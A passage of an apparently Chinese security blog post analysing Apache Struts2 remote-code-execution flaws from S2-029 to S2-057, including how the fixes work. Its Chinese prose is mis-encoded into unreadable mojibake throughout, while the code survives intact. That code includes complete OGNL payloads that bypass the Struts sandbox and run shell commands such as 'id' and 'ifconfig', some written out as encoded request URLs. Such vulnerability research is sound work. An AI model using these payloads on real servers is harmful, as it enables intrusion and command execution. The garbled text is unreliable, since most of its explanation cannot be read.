ä¿®å¤è¿™é‡Œåé¢çš„å‡ ä¸ªç‰ˆæœ¬éƒ½æ˜¯å…è®¸æ‰§è¡Œçš„ï¼Œå¼€å‘è€…æ¨¡å¼ä¸‹çš„commandå¹¶æ²¡æœ‰è¢«å–æ¶ˆæ‰ï¼Œæ‰€ä»¥å¦‚æœåœ¨çº¿ä¸Šç¯å¢ƒç¢°åˆ°debugæ¨¡å¼ï¼Œé‚£å°±å¯ä»¥å°è¯•ä¸€ä¸‹OGNLè¡¨è¾¾å¼çš„æ‰§è¡Œ ä½†æ˜¯ç”±äºä»struts2 2.3.20ä¹‹åå¼•å…¥äº†é»‘åå•æ¨¡å¼ï¼ˆexcludedClasses, excludedPackageNames å’Œ excludedPackageNamePatternsï¼‰ï¼Œå¹¶ä¸”ä½¿ç”¨æ„é€ å‡½æ•°çš„æ–¹å¼ä¹Ÿå¤±æ•ˆäº† è¿™é‡Œå‰è¾ˆä»¬ç”¨åˆ°äº†å°†SecurityMemberAccessåˆå§‹åŒ–çš„æ–¹å¼æ¥ç»•è¿‡è¿™ä¸ªé™åˆ¶ï¼ŒåŸç†å¯ä»¥å¥½å¥½çœ‹çœ‹è¿™ç¯‡æ–‡ç« https://paper.seebug.org/794/#33-struts-2329ã€‚ 1debug=command&amp;expression=((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app'))) åç»­è¿˜æœ‰ä¸€äº›ç»•è¿‡ï¼Œåé¢å†è®² 12. S2-029/S2-036S2-029å½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.24.1 (except 2.3.20.3) S2-036å½±å“èŒƒå›´ï¼šStruts 2.0.0 - Struts 2.3.28.1 ï¼ˆè·ŸS2-029ä¸€æ ·ï¼Œä¸»è¦åœ¨ä¿®å¤çš„åœ°æ–¹è®²ï¼‰ åŸç†è·ŸS2-001å·®ä¸å¤šï¼ŒS2-029çš„è§¦å‘éœ€è¦jspç”¨åˆ°æ ‡ç­¾&lt;s:textfield name=&quot;%{xxxx}&quot;&gt;&lt;/s:textfield&gt;ï¼Œnameå±æ€§ä¸­ç”±ä¸€OGNLè¡¨è¾¾å¼è§£æè€Œå¾—ï¼Œæ„å‘³ç€ç”Ÿæˆçš„inputæ ‡ç­¾çš„nameå±æ€§æ˜¯åŠ¨æ€è®¡ç®—è€Œå¾—çš„ï¼Œæ¯”å¦‚?xxxx=usernameï¼Œæ­¤æ—¶è§£æå¾—åˆ°çš„input.nameä¸ºusernameã€‚è¿™å…¶ä¸­æ‰§è¡Œäº†%{xxxx}ï¼Œè·å¾—xxxxçš„å†…å®¹ã€‚è€ŒS2-001çš„ä¿®å¤ä¸»è¦è§£å†³çš„æ˜¯é€’å½’è®¡ç®—OGNLè¡¨è¾¾å¼çš„é—®é¢˜ï¼ŒS2-029å°±æ˜¯åœ¨è¿›å…¥translateVariablesä¹‹å‰å°±å°†ç¬¬ä¸€å±‚çš„OGNLè¡¨è¾¾å¼æ‰§è¡Œå®Œæ¯• ç›´æ¥çœ‹UIBean.evaluateParams é¦–å…ˆè®¡ç®—%{message}åˆ°æˆ‘ä»¬ä¼ å…¥çš„OGNLè¡¨è¾¾å¼ åç»­ä¼šåœ¨æˆ‘ä»¬ä¼ å…¥çš„OGNLè¡¨è¾¾å¼æ‹¬ä¸Š%{xxx} æ­¤æ—¶å†ä¼ å…¥åˆ°findValueå°±æ˜¯ç¬¬äºŒå±‚çš„OGNLè¡¨è¾¾å¼ï¼Œåç»­è·ŸS2-001ä¸€æ ·ï¼Œåªéœ€è¦æ‰§è¡Œä¸€æ¬¡OGNLè¡¨è¾¾å¼è®¡ç®—å³å¯ POC123456// éœ€è¦å…ˆåˆå§‹åŒ–SecurityMemberAccessï¼Œä¸ç„¶æ— æ³•æ‰§è¡Œ?message=((%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('open+/System/Applications/Calculator.app')))// å›æ˜¾POC?message=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23ret=@java.lang.Runtime@getRuntime().exec('id')),%23q=@org.apache.commons.io.IOUtils@toString(%23ret.getInputStream()) // S2-036 ((#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ret=@java.lang.Runtime@getRuntime().exec('id'))).(#q=@org.apache.commons.io.IOUtils@toString(#ret.getInputStream())) ä¿®å¤S2-029com.opensymphony.xwork2.ognl.OgnlUtil#compileAndExecute åœ¨è®¡ç®—è¡¨è¾¾å¼ä¹‹å‰ï¼ŒéªŒè¯æ˜¯å¦å¯ä»¥æ‰§è¡Œ è¿™é‡Œå…ˆçœ‹node.isEvalChainï¼Œè¿™é‡Œæ˜¯å¯¹S2-009åšçš„é™åˆ¶ï¼Œä¹Ÿå°±æ˜¯å½“å‡ºç°((1)(2))æ—¶ï¼Œä¼šè§£æå‡ºASTEvalèŠ‚ç‚¹ï¼Œè€ŒASTEvalå¯¹è±¡çš„isEvalChainå‡½æ•°ç›´æ¥è¿”å›trueï¼Œä¹Ÿå°±ä½¿å¾—(1)(2)æ— æ³•æ‰§è¡Œ å…¶æ¬¡å†æ¥çœ‹node.isSequenceï¼Œè¿™é‡Œæ˜¯å¯¹å½¢å¦‚(xxx1,xxx2,xxx3)çš„OGNLè¡¨è¾¾å¼çš„é™åˆ¶ï¼Œä»–å°†è§£æå‡ºASTSequenceèŠ‚ç‚¹ï¼ŒASTSequenceå¯¹è±¡çš„isSequenceç›´æ¥è¿”å›trueï¼Œä¹Ÿå°±é™åˆ¶äº†è¿™ç§è¡¨è¾¾å¼çš„æ‰§è¡Œ ç„¶åæ¯”è¾ƒæœ‰æ„æ€çš„æ˜¯ï¼Œå¯¹äºå½¢å¦‚((xxx1).(xxx2).(xxx3))çš„OGNLè¡¨è¾¾å¼ï¼Œè¿™æ˜¯ä¸€ç§ASTChainï¼Œä½†å…¶ä¸­å¹¶ä¸ä¼šè§£æå‡ºASTEval çœ‹å‰é¢çš„åˆ†æï¼ŒçŸ¥é“å¯ä»¥å°†S2-029çš„ä¿®å¤bypassæ‰ï¼Œä¹Ÿå°±æ˜¯S2-036çš„é—®é¢˜ 13. S2-032/S2-033/S2-037å½±å“èŒƒå›´ï¼šStruts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3) è¿™é‡Œæˆ‘çš„ç¯å¢ƒæ­çš„æ˜¯rest-showcaseçš„ï¼Œæ‰€ä»¥ä¸»è¦è®²S2-033ï¼ˆS2-032çš„åŸç†è·Ÿä»–å·®ä¸å¤šï¼Œåªæ˜¯è§¦å‘å˜æˆäº†method:#_xxxx) rest-pluginæ”¯æŒè§£æxxx!methodçš„è°ƒç”¨ org.apache.struts2.rest.RestActionMapper#handleDynamicMethodInvocationè§£æname!methodï¼Œå¹¶å¯¹å½“å‰çš„restactionmapperè®¾ç½®å¥½åç»­è¦è°ƒç”¨method åœ¨struts2çš„æ‰€æœ‰intercepterè°ƒç”¨å®Œæ¯•åï¼Œä¼šå»è°ƒç”¨DefaultActionInvocationçš„invokeActionOnlyå‡½æ•° è€ŒinvokeActionOnlyä¼šå»è°ƒç”¨com.opensymphony.xwork2.DefaultActionInvocation#invokeAction åœ¨è¿™ä¸ªå‡½æ•°é‡Œï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–å°†å‰é¢å¯æ§çš„methodNameæ”¾è¿›äº†ognlUtil.getValueï¼Œå¯¼è‡´äº†OGNLè¡¨è¾¾å¼çš„æ‰§è¡Œ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å‰é¢è°ƒç”¨çš„interceptoré‡Œä¸èƒ½å‡ºç°å¼‚å¸¸çš„æƒ…å†µï¼Œä¼šå¯¼è‡´æ— æ³•æ‰§è¡Œåˆ°OGNLè¡¨è¾¾å¼æ‰§è¡Œçš„ä½ç½®ã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆä¸èƒ½åœ¨å¼€å¯devModeçš„æƒ…å†µä¸‹è¿›è¡Œåˆ©ç”¨çš„åŸå› ã€‚ POC1234http://localhost:8080/showcase_war/orders/3!%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2C%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush()%2C%23xx%3D123%2C%23xx.toString.json?command=ifconfig// S2-037http://localhost:8080/showcase_war/orders/3!(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig è¿™é‡Œæˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤ç”¨#parameters.command[0]çš„æ–¹å¼æ¥è·å–ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ç”ŸæˆDefaultActionProxyçš„æ—¶å€™å¯¹methodNameåšäº†è½¬ä¹‰å¤„ç†ï¼Œä¸ºäº†é¿å…è½¬ä¹‰ç ´åOGNLè¡¨è¾¾å¼ï¼Œç”¨#parametersçš„æ–¹å¼ä»å‚æ•°ä¸­è·å–ã€‚ è¿˜æœ‰ä¸€ä¸ªéœ€è¦æ³¨æ„çš„åœ°æ–¹æ˜¯ï¼Œåœ¨æœ€åè°ƒç”¨ognlUtil.getValueæ—¶ï¼Œåœ¨methodNameåé¢æ‹¼æ¥äº†()ï¼Œæˆ‘ä»¬éœ€è¦å°†è¿™ä¸ª()åšå¤„ç†ï¼Œæ¯”å¦‚è¿™é‡Œçš„POCåšçš„å¤„ç†æ˜¯#xx.toStringå»åƒæ‰è¿™ä¸ª() S2-032/S2-033ä¿®å¤ xwork-core:2.3.28.1åœ¨OgnlUtil.isEvalExpressionå¢åŠ äº†isSequenceçš„åˆ¤æ–­ è¿™é‡Œå‡ºç°äº†æ–°çš„ä¸€ç§åˆ©ç”¨æ–¹å¼(1)?(2):(3)ï¼Œè¿™ç§å½¢å¼çš„OGNLè¡¨è¾¾å¼å°†æœ‰ASTTestå¯¹è±¡æ¥å¤„ç† è€ŒisEvalChain()å’ŒisSequence()é™åˆ¶çš„æ˜¯ASTEvalå’ŒASTSequenceå¯¹è±¡ï¼Œè¿™é‡Œå¹¶æ²¡æœ‰å¯¹ASTTeståšé™åˆ¶ï¼Œå¹¶ä¸”ç”±äºisSequenceå¹¶ä¸æ˜¯é€’å½’å»åˆ¤æ–­çš„ï¼Œæ‰€ä»¥åœ¨ASTTestçš„childrenèŠ‚ç‚¹ä¸Šå†å‡ºç°ASTSequenceä¹Ÿæ˜¯okçš„ æ ¹æ®è¿™ä¸ªåŸç†ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºæ–°çš„POC 1(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)?(#process=@java.lang.Runtime@getRuntime().exec(#parameters.command[0]),#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()),@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros),#ros.flush()):d.json S2-037ä¿®å¤ åœ¨è§£æname!methodçš„åœ°æ–¹ï¼Œè°ƒç”¨äº†cleanupActionName ä½¿ç”¨äº†æ­£åˆ™ï¼Œé˜²æ­¢å‡ºç°(#@)ç­‰ç‰¹æ®Šå­—ç¬¦ï¼Œå‡ºç°å°±æŠ¥é”™ï¼Œä¹Ÿå°±åˆ°ä¸äº†åç»­çš„OGNLè¡¨è¾¾å¼çš„æ‰§è¡Œ å¹¶ä¸”åœ¨ç¦æ­¢çš„classåˆ—è¡¨é‡Œå¢åŠ äº†ä¸¤ä¸ª ä½¿å¾—æˆ‘ä»¬ä¸èƒ½åœ¨ç”¨`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`æ¥ç»•è¿‡é™åˆ¶ ä¸€ä¸ªæœ‰æ„æ€çš„åœ°æ–¹å‰é¢è¯´åˆ°è¿™3ä¸ªæ¼æ´éœ€è¦å¼€å¯DynamicMethodInvocationï¼Œå…¶å®ä¸å¼€å¯ä¹Ÿæ˜¯å¯ä»¥çš„ å‰é¢è¯´çš„å‡ ç§æ–¹æ³•éƒ½æ˜¯åœ¨å¤„ç†name!methodè¿™ä¸ªæ ¼å¼ï¼Œrestå…¶å®è¿˜æ”¯æŒå¯¹action/id/methodçš„è§£æ æ‰€ä»¥æ”¹æ”¹POCå°±èƒ½é€šæ€rest-pluginäº† 1http://localhost:8080/showcase_war/orders/3/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F(%23process%3D%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5B0%5D)%2C%23ros%3D(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2C%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2C%23ros)%2C%23ros.flush())%3Ad.json?command=ifconfig 14. S2-045/S2-046å½±å“ç‰ˆæœ¬ï¼šStruts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10 S2-046åŸç†ä¸€æ ·ï¼Œè¿™é‡Œåªåˆ†æS2-045 è¿™é‡Œ2.3å’Œ2.5ç‰ˆæœ¬å˜åŒ–æ¯”è¾ƒå¤§ï¼Œè¿™é‡Œä»¥2.3.31çš„ä»£ç åˆ†æï¼Œçœ‹2.5çš„å¯ä»¥çœ‹https://paper.seebug.org/247/ ä»struts2çš„å·¥ä½œæµç¨‹å›¾æ¥çœ‹ï¼Œæ‰€æœ‰çš„è¯·æ±‚åœ¨ç”ŸæˆActionProxyä¹‹å‰ï¼Œéƒ½ç”±FilterDispatcheræ¥å¤„ç†ï¼Œ2.3ç‰ˆæœ¬ç”¨çš„æ˜¯org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilterï¼Œè¿™é‡Œåœ¨è°ƒç”¨actionä¹‹å‰ä¼šå…ˆå°è£…requestã€‚ çœ‹çœ‹è°ƒç”¨æ ˆ å°è£…å®é™…ç”±org.apache.struts2.dispatcher.Dispatcher#wrapRequestå¤„ç† å¯ä»¥çœ‹åˆ°è¿™é‡Œåœ¨å¤„ç†Content-Type: multipart/form-dataç±»å‹æ—¶ï¼Œä¼šç”Ÿæˆorg.apache.struts2.dispatcher.multipart.MultiPartRequestWrapperå¤„ç†ï¼ŒS2-045å°±æ˜¯å‡ºé—®é¢˜åœ¨è¿™é‡Œ åœ¨ç”¨JakartaMultiPartRequestè§£ærequeståŒ…æ—¶ï¼Œè°ƒç”¨org.apache.commons.fileupload.FileUploadBase.FileItemIteratorImpl#FileItemIteratorImplæ¥æ£€æŸ¥Content-Typeçš„å†…å®¹ï¼Œéœ€è¦ç”±multipart/å¼€å¤´æ‰è¡Œï¼Œä¸ç„¶å°±æ˜¯æŠ¥é”™å¹¶å°†å…·ä½“çš„contentTypeå†…å®¹å†™åˆ°å¼‚å¸¸é‡Œ è¿™é‡Œæˆ‘ä»¬çš„å¯æ§æ•°æ®å°±åˆ°äº†å¼‚å¸¸ä¸Šï¼Œå°±çœ‹struts2æ˜¯æ€ä¹ˆå¤„ç†å¼‚å¸¸äº† org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest#parse å¯æ§å†…å®¹ä¼ å…¥äº†com.opensymphony.xwork2.util.LocalizedTextUtil#findText å½“å‰éƒ½æ²¡ç”Ÿæˆé”™è¯¯ä¿¡æ¯æ—¶ï¼Œå°†è·å–é»˜è®¤çš„message è¿™é‡Œåˆ°äº†æˆ‘ä»¬ç†Ÿæ‚‰çš„TextParseUtil.translateVariableså‡½æ•°ï¼Œä»–åç»­ä¼šå¤„ç†è®¡ç®—OGNLè¡¨è¾¾å¼ ç®€å•æ¥è¯´ï¼Œæ•´ä¸ªè¿‡ç¨‹ä»æŠ¥é”™å¼€å§‹å­˜å…¥OGNLè¡¨è¾¾å¼ï¼Œå†ç”Ÿæˆé”™è¯¯ä¿¡æ¯çš„æ—¶å€™è®¡ç®—äº†OGNLè¡¨è¾¾å¼ åˆ°äº†è¿™é‡Œæ‰§è¡Œå¯æ§çš„OGNLè¡¨è¾¾å¼æ˜¯ç¬¬ä¸€æ­¥ï¼Œå› ä¸º2.3.29å¢åŠ äº†å¯¹`#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS`çš„é™åˆ¶ éœ€è¦ä¸€ç§æ–°çš„æ€è·¯æ¥ç»•è¿‡ï¼ŒS2-045çš„POCå°±ç»™æˆ‘ä»¬æä¾›è¿™æ ·ä¸€ä¸ªæ€è·¯ POC1234567891011121314151617181920%&#123;(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm): ( (#container=#context['com.opensymphony.xwork2.ActionContext.container']). (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)). (#ognlUtil.getExcludedPackageNames().clear()). (#ognlUtil.getExcludedClasses().clear()). (#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125; ä¸»è¦çœ‹5-10è¡Œï¼Œä¸€å¼€å§‹çš„æ€è·¯æ˜¯ç›´æ¥ç”¨èµ‹å€¼çš„æ–¹å¼æ¥è¦†ç›–å­˜åœ¨é™åˆ¶çš„SecurityMemberAccessï¼Œä½†æ˜¯ç°åœ¨æœ‰äº†excludedClassesçš„é™åˆ¶ä¸èƒ½ç›´æ¥ç”¨è¿™ç§æ–¹å¼æ¥è¾¾æˆï¼ˆå…·ä½“çœ‹SecurityMemberAccess.isAccessibleï¼‰ã€‚ é‚£ä¹ˆå°±çœ‹çœ‹èƒ½ä¸èƒ½ç”¨setterså»è®¾ç½®SecurityMemberAccess è¿™é‡Œå°±çœ‹ognl.OgnlContext#setMemberAccessï¼Œè€Œè¿™ä¸ªcontextå°±æ˜¯æˆ‘ä»¬åœ¨OGNLè¡¨è¾¾å¼é‡Œç”¨#contextè¡¨ç¤ºçš„ é‚£ä¹ˆç›´æ¥ç”¨#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)å°±å¯ä»¥è¦†ç›–åŸæœ‰çš„MemberAccessï¼Œä½†æ˜¯å› ä¸º#contextæœ¬èº«å°±æ˜¯è¢«ç¦æ­¢çš„ç±»ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥è°ƒç”¨ä»–ã€‚ æˆ‘ä»¬éœ€è¦é¦–å…ˆå»é™¤æ‰ExcludedPackageNameså’ŒExcludedClasses æ¥çœ‹çœ‹ä»–æ˜¯æ€ä¹ˆè®¾ç½®çš„com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil å¯ä»¥çœ‹åˆ°securityMemberAccessçš„ç›¸å…³ç¦ç”¨è®¾ç½®éƒ½æ˜¯æ¥è‡ªäºognlUtilï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªéœ€è¦æ¸…é™¤æ‰ognlUtilçš„ç¦ç”¨è®¾ç½®å°±å¯ä»¥æ¶ˆé™¤æ‰securityMemberAccessçš„é™åˆ¶ã€‚è¿™æ˜¯å› ä¸ºåœ¨jvmé‡Œé¢ä»–ä»¬ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ªå®ä¾‹ã€‚ æ‰€ä»¥ä¸Šé¢çš„POCä¸­ç”¨struts2çš„containerçš„æ–¹å¼å»è·å–ognlUtilå®ä¾‹ï¼Œå¹¶å°†å…¶ç¦ç”¨è®¾ç½®å…¨éƒ¨æ¸…é™¤æ‰ é‚£ä¹ˆåé¢å†ç”¨#context.setMemberAccesså°±æ²¡æœ‰é˜»ç¢äº† åç»­çš„ä»£ç å°±æ˜¯æ‰§è¡Œå¹¶å›æ˜¾äº†ï¼Œè·Ÿå‰é¢çš„ç±»ä¼¼ ä¿®å¤ ä¿®å¤ä¸»è¦æ˜¯ä¸æŠŠmessageä¼ å…¥ï¼Œæ”¾åˆ°äº†argsçš„ä½ç½® 15. S2-048è¿™ä¸€éƒ¨åˆ†ä¸ä»”ç»†è¯´äº†ï¼Œçœ‹https://www.freebuf.com/vuls/217482.html 16. S2-052å½±å“èŒƒå›´:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12 The REST Plugin is using a XStreamHandler with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads. struts2çš„restæ’ä»¶æ³¨å†Œäº†ContentTypeInterceptoræ¥å¤„ç†ä¸åŒçš„content-type é’ˆå¯¹xmlç±»å‹ï¼Œå°†è°ƒç”¨XStreamHandleræ¥å¤„ç† org.apache.struts2.rest.ContentTypeInterceptor#intercept æ ¹æ®requestè¯·æ±‚é€‰æ‹©handlerï¼Œè¿™é‡Œæˆ‘ä»¬ä¼ å…¥application/xmlç±»å‹ï¼Œå°†ä½¿ç”¨org.apache.struts2.rest.handler.XStreamHandler#toObjectæ¥å¤„ç†xml è¿™é‡Œç”¨äº†æœ€ç®€å•çš„è°ƒç”¨æ–¹å¼ï¼ˆ1.4.8ç‰ˆæœ¬ï¼‰ï¼Œæ²¡æœ‰åšxstreamçš„ç›¸å…³å®‰å…¨å¤„ç†ï¼Œå¯¼è‡´XStreamååºåˆ—åŒ– æ‰€ä»¥æˆ‘ä»¬ä¼ å…¥æ„é€ å¥½çš„XMLå°±å¯ä»¥è¾¾åˆ°å‘½ä»¤æ‰§è¡Œ POCè¿™é‡Œçš„xmlå¯ä»¥ç”¨æˆ‘çš„ysomapå»ç”Ÿæˆï¼ŒæŠŠContent-Typeè®¾ç½®æˆapplication/xmlå°±å¯ä»¥äº† ä¿®å¤S2-052è·Ÿä»¥å¾€çš„æ¼æ´ä¸ä¸€æ ·ï¼Œè¿™é‡Œè·ŸOGNLè¡¨è¾¾å¼å¹¶æ²¡æœ‰ä»€ä¹ˆå…³ç³»äº†ï¼Œä¿®å¤ä¹Ÿæ¯”è¾ƒç®€å• å‡çº§XStreamåˆ°äº†1.4.10ç‰ˆæœ¬ï¼Œå¹¶ä¸”æ·»åŠ äº†å®‰å…¨æªæ–½ è¿™é‡Œæ–°æ·»åŠ äº†AllowedClassesã€AllowedClassNamesã€XStreamPermissionProvideræ¥è®¾ç½®æ¯ä¸ªç±»å¯ä»¥ååºåˆ—åŒ–çš„å¯¹è±¡åˆ—è¡¨ ä¹Ÿä¼šæ·»åŠ ä¸€äº›é»˜è®¤çš„ç±» è¿™é‡Œçš„ç”¨æ³•å°±æ˜¯XStreamå®˜æ–¹æ¨èçš„ï¼Œé‡‡ç”¨ç™½åå•çš„æ–¹å¼æ¥é˜²æ­¢ä¸å®‰å…¨çš„ååºåˆ—åŒ– 17. S2-053å½±å“ç‰ˆæœ¬:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1 S2-053é—®é¢˜å‡ºåœ¨freemarkerçš„æ ‡ç­¾å†…å®¹å¯æ§æ—¶å‡ºç°çš„é—®é¢˜ åœ¨actionæ‰§è¡Œç»“æŸåï¼Œç”±äºè®¾ç½®çš„ç±»å‹ä¸ºfreemarkerï¼Œæ‰€ä»¥ç»“æœäº¤ç”±freemarkeræ¥å¤„ç† å…³æ³¨å¯¹freemarkeræ ‡ç­¾è§£æçš„ç±»org.apache.struts2.views.freemarker.tags.CallbackWriter#onStart å› ä¸ºè¿™é‡Œæˆ‘ä»¬æ—¶urlæ ‡ç­¾ï¼Œæ‰€ä»¥ç”±org.apache.struts2.components.URL#startæ¥å¤„ç† å›åˆ°äº†ç”±ServletUrlRendereræ¥è§£ææˆ‘ä»¬ä¼ å…¥çš„OGNLè¡¨è¾¾å¼ï¼Œè·ŸS2-013ä¸€æ ·ï¼Œåç»­ä¹Ÿæ˜¯ç”±TextParseUtil.translateVariablesè§¦å‘çš„ POCpocå¯ä»¥ç›´æ¥ç”¨S2-045çš„poc 12%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;// è®°å¾—ç¼–ç  ä¿®å¤ è¿™æ¬¡çš„ä¿®å¤æ˜¯åœ¨FreemarkerManagerä¸­å¤šäº†ä¸¤è¡Œä»£ç ï¼Œ 123&gt; LOG.debug(&quot;Sets NewBuiltinClassResolver to TemplateClassResolver.SAFER_RESOLVER&quot;, new String[0]);&gt; configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);&gt; å»çœ‹äº†ä¸€ä¸‹TemplateClassResolver.SAFER_RESOLVER)çš„å®˜æ–¹æ–‡æ¡£ï¼Œ 12&gt; TemplateClassResolver.SAFER_RESOLVER now disallows creating freemarker.template.utility.JythonRuntime and freemarker.template.utility.Execute. This change affects the behavior of the new built-in if FreeMarker was configured to use SAFER_RESOLVER, which is not the default until 2.4 and is hence improbable.&gt; å¤§è‡´æ„æ€åº”è¯¥å°±æ˜¯ç¦æ­¢äº†freemarkerçš„RCEï¼Œå…·ä½“æˆ‘å¯¹freemarkerä¸å¤ªäº†è§£ï¼Œå°±ä¸å»è¯¯äººå­å¼Ÿäº†ã€‚ ä¿®å¤ç›´æ¥å‚è€ƒhttps://www.freebuf.com/vuls/217482.html 18. S2-055å½±å“èŒƒå›´ï¼šStruts 2.5 - Struts 2.5.14 S2-055æ¼æ´åŸç†è·ŸS2-052ä¸€æ ·ï¼Œç”±jacksonåº“å¤„ç†jsonå†…å®¹æ—¶äº§ç”Ÿçš„æ¼æ´ï¼Œè¿™é‡Œé»˜è®¤ä¸æ˜¯ç”¨jacksonå¤„ç†jsonå†…å®¹çš„ï¼Œå¾—åœ¨struts.xmlé…ç½® 12&lt;bean type=\"org.apache.struts2.rest.handler.ContentTypeHandler\" name=\"jackson\" class=\"org.apache.struts2.rest.handler.JacksonLibHandler\"/&gt; &lt;constant name=\"struts.rest.handlerOverride.json\" value=\"jackson\"/&gt; è¿™é‡Œæœ¬èº«æ˜¯å› ä¸ºjacksonååºåˆ—åŒ–é—®é¢˜äº§ç”Ÿçš„ï¼Œåé¢æŠ½ç©ºåˆ†æä¸€ä¸‹è¿™ä¸ªjacksonï¼Œè¿™é‡Œä¸ç»§ç»­åˆ†æäº† å› ä¸ºéœ€è¦é…ç½®æ‰å¯ä»¥æ‰“ï¼Œæ‰€ä»¥è¿™é‡Œçš„å±å®³å¹¶æ²¡æœ‰æƒ³xstreamä¸€æ ·ä¸¥é‡ å…·ä½“åˆ†æè§http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/ 19. S2-057å½±å“èŒƒå›´ï¼šStruts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16 åŒ—äº¬æ—¶é—´8æœˆ22æ—¥13æ—¶ï¼ŒApacheå®˜æ–¹å‘å¸ƒé€šå‘Šå…¬å¸ƒäº†Struts2ä¸­ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2018-11776ï¼‰ã€‚è¯¥æ¼æ´åœ¨ä¸¤ç§æƒ…å†µä¸‹å­˜åœ¨ï¼Œç¬¬ä¸€ï¼Œåœ¨xmlé…ç½®ä¸­æœªè®¾ç½®namespaceå€¼ï¼Œä¸”ä¸Šå±‚åŠ¨ä½œé…ç½®ï¼ˆupper action(s) configurationsï¼‰ä¸­æœªè®¾ç½®æˆ–ç”¨é€šé…ç¬¦namespaceå€¼ã€‚ç¬¬äºŒï¼Œä½¿ç”¨æœªè®¾ç½® valueå’Œactionå€¼çš„urlæ ‡ç­¾ï¼Œä¸”ä¸Šå±‚åŠ¨ä½œé…ç½®ï¼ˆupper action(s) configurationsï¼‰ä¸­æœªè®¾ç½®æˆ–ç”¨é€šé…ç¬¦namespaceå€¼ã€‚ https://paper.seebug.org/682/ è¿™é‡Œä¸€ç§é…ç½®æ–¹æ¡ˆæ˜¯ æ²¡æœ‰é…ç½®namespaceï¼Œè®¿é—®s2057.actionéƒ½ä¼šå¯¼å‘test.actionï¼Œè¿™é‡Œå¤„ç†redirectActionçš„æ˜¯ org.apache.struts2.dispatcher.ServletActionRedirectResult#execute 